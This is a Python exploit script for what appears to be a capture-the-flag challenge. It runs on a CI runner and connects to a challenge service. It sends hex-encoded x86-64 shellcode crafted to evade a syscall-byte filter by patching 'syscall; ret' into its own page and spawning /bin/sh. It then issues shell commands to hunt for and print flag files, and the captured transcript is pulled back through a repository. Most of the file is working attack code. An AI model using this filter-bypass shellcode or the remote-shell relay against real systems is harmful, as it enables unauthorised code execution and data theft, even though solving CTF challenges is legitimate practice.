#!/usr/bin/env python3
"""
relay.py -- runs on a GitHub Actions runner (which has real internet).

Connects to the challenge instance, authenticates with the instance token,
sends the guard-bypass shellcode (solve/payload.bin) and drives the shell
until the flag is printed.  Everything that came over the socket is written
to --out so it can be pulled back through the repository.

No third-party imports: the runner needs nothing but python3.
"""

import argparse
import os
import re
import socket
import struct
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))

# Bypass payload (identical to payload.bin / build.sh output):
# patch "syscall; ret" into its own RWX page, execve("/bin/sh"),
# fallback open("/flag.txt")+read+write.
PAYLOAD_HEX = (
    "488d1d65000000c6030fc6430105c64302c331c05048b82f62696e2f736800504889e7"
    "31f631d231c0b03bffd36a7448b82f666c61672e7478504889e731f631d231c0b002ff"
    "d389c74881ec000200004889e631d2b60131c0ffd389c2bf010000004889e631c0b001"
    "ffd3c3909090"
)

CMDS = [
    b"echo __PWNED__; id",
    b"ls -la / 2>/dev/null",
    b"cat /flag /flag.txt /flag* 2>/dev/null",
    b"cat flag flag.txt flag* /home/*/flag* /app/*flag* /srv/*flag* 2>/dev/null",
    b"find / -maxdepth 3 -iname '*flag*' 2>/dev/null | head -20",
    b"exit",
]


def load_payload() -> bytes:
    p = os.path.join(HERE, "payload.bin")
    if os.path.exists(p):
        data = open(p, "rb").read()
    else:
        data = bytes.fromhex(PAYLOAD_HEX)
    for bad in (b"\x0f\x05", b"\xcd\x80", b"\x0f\x34"):
        assert bad not in data, "payload contains forbidden bigram %r" % bad
    return data


def drain(sock: socket.socket, seconds: float, sink: bytearray) -> bytes:
    sock.settimeout(0.4)
    end = time.time() + seconds
    got = bytearray()
    while time.time() < end:
        try:
            chunk = sock.recv(4096)
        except (socket.timeout, TimeoutError):
            continue
        except OSError:
            break
        if not chunk:
            break
        got += chunk
        sink += chunk
    return bytes(got)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--out", default="ci-out.txt")
    ap.add_argument("--token-env", default="TOKEN")
    a = ap.parse_args()

    token = os.environ.get(a.token_env, "").strip()
    payload = load_payload()
    log = bytearray()

    print("[*] connecting to %s:%d" % (a.host, a.port), flush=True)
    s = socket.create_connection((a.host, a.port), timeout=20)

    banner = drain(s, 4.0, log)
    print("[*] banner (%d bytes): %r" % (len(banner), banner[:300]), flush=True)

    if token:
        # token-gated proxy: the first line we send is the instance token
        s.sendall(token.encode() + b"\n")
        print("[*] token sent", flush=True)

    after = drain(s, 6.0, log)
    print("[*] after token (%d bytes): %r" % (len(after), after[:400]), flush=True)

    low = bytes(log).lower()
    looks_like_challenge = (
        b"filter" in low
        or b"shellcode" in low
        or b"harmless" in low
        or (b"token" in low and b"invalid" not in low and b"wrong" not in low)
        or len(after) == 0
    )

    if looks_like_challenge:
        print("[*] sending payload (%d bytes)" % len(payload), flush=True)
        s.sendall(struct.pack("<I", len(payload)) + payload)
        out = drain(s, 4.0, log)
        print("[*] after payload: %r" % out[:400], flush=True)

        if b"Executing" in bytes(log):
            for cmd in CMDS:
                try:
                    s.sendall(cmd + b"\n")
                except OSError:
                    break
                chunk = drain(s, 1.6, log)
                print("[*] $ %s -> %r" % (cmd.decode("latin1"), chunk[:300]), flush=True)
                if b"__PWNED__" not in bytes(log) and cmd == CMDS[0]:
                    # no shell: nothing else will work, stop poking
                    if b"harmless" not in bytes(log):
                        break
        else:
            print("[*] no 'Executing' in transcript", flush=True)
    else:
        print("[*] unexpected prompt, not sending payload", flush=True)

    try:
        s.sendall(b"exit\n")
    except OSError:
        pass
    drain(s, 1.0, log)
    s.close()

    text = bytes(log).decode("latin1", "replace")
    m = re.search(r"ctfcup\{[^}\r\n]*\}", text)
    print("[*] flag in transcript: %s" % (m.group(0) if m else "NOT FOUND"), flush=True)

    with open(a.out, "w") as f:
        f.write(text)
    print("[*] wrote %s (%d bytes)" % (a.out, len(text)), flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
